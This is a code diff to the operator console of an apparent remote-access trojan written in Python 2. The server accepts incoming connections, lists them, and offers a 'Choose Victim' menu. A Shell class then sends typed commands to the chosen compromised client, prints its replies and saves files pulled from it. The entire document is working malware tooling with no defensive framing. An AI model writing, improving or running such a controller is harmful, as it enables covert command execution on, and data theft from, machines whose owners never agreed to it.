@@ -16,6 +16,10 @@ class Server:
         self.socket.bind((hostname, port))
         self.socket.listen(5)
 
+    def run(self):
+        self._enable_threading()
+        Menu(self).main_menu()
+
     def accept_connections(self):
         while True:
             socket, addr = self.socket.accept()
@@ -28,8 +32,8 @@ class Server:
                 client.close()
 
     def refresh_connections(self):
-        table = []
         index = 0
+        table = []
         with self.locking:
             for client in self.connections:
                 if client.sync():
@@ -37,33 +41,43 @@ class Server:
                     index += 1
                 else:
                     self.connections.remove(client)
-        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
-                       tablefmt='psql'))
+        return table
 
     def _enable_threading(self):
         thread = threading.Thread(target=self.accept_connections)
         thread.daemon = True
         thread.start()
 
-    def run(self):
-        self._enable_threading()
-        Menu(self).main_menu()
-
-    def find_client(self, client_id):
+    def search_client(self, client_id):
         try:
             with self.locking:
                 client = self.connections[int(client_id)]
             return client
         except IndexError:
-            print("Index does not exist. \n")
+            print "Index does not exist. \n"
 
 
-class FileBrowser:
+class Shell:
 
     def __init__(self, client):
         self.client = client
+        self.local_commands = ['cp', 'clear', 'exit']
+        self.stop = False
 
-    def file_transfer(self):
+    def run(self):
+        while not self.stop:
+            input_command = raw_input("$ ")
+            if input_command in self.local_commands:
+                getattr(self, input_command)()
+            else:
+                self.client.socket.sendall(input_command)
+                received = self.client.socket.recv(4096)
+                print(received)
+
+    def clear(self):
+        os.system("clear")
+
+    def cp(self):
         name = uuid.uuid4().hex
         f = open("received/" + name, 'wb')
 
@@ -80,21 +94,8 @@ class FileBrowser:
             break
         f.close()
 
-    def run(self):
-        exit = False
-        while not exit:
-            command = raw_input("Type a command: ")
-            if command == "exit":
-                exit = True
-                os.system("clear")
-            elif command == "clear":
-                os.system("clear")
-            else:
-                self.client.socket.sendall(command)
-                received = self.client.socket.recv(4096)
-                print(received)
-                # if command.startswith("cp"):
-                #     self.file_transfer()
+    def exit(self):
+        self.stop = True
 
 
 class ClientConnection:
@@ -127,18 +128,14 @@ class Menu:
         }
 
     def main_menu(self):
-        os.system('clear')
-        print "Welcome,\n"
-        print "Please choose the menu you want to start:"
         print "1. Show Connections"
         print "2. Choose Victim"
         print "\n0. Quit"
-        choice = raw_input(" >>  ")
+        choice = raw_input(">>  ")
         self.exec_menu(choice)
         return
 
     def exec_menu(self, choice):
-        os.system('clear')
         ch = choice.lower()
         if ch == '':
             self.menu_actions['main_menu']()
@@ -146,27 +143,29 @@ class Menu:
             try:
                 self.menu_actions[ch]()
             except KeyError:
+                os.system('clear')
                 print "Invalid selection, please try again.\n"
                 self.menu_actions['main_menu']()
         return
 
     def show_connections(self):
-        print "Connections !\n"
-        self.server.refresh_connections()
-        print "9. Back"
-        print "0. Quit"
-        choice = raw_input(" >>  ")
-        self.exec_menu(choice)
+        os.system('clear')
+        print "Connections !"
+        table = self.server.refresh_connections()
+        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
+                       tablefmt='psql'))
+        self.back()
 
     def choose_victim(self):
-        self.server.refresh_connections()
-        choice = raw_input(" >>  ")
-        client = self.server.find_client(choice)
+        print "Choose Victim !"
+        choice = raw_input(">>  ")
+        client = self.server.search_client(choice)
         if client:
-            FileBrowser(client).run()
+            Shell(client).run()
         else:
+            os.system('clear')
             print "Invalid selection, please try again.\n"
-        self.menu_actions['main_menu']()
+        self.back()
         return
 
     def back(self):
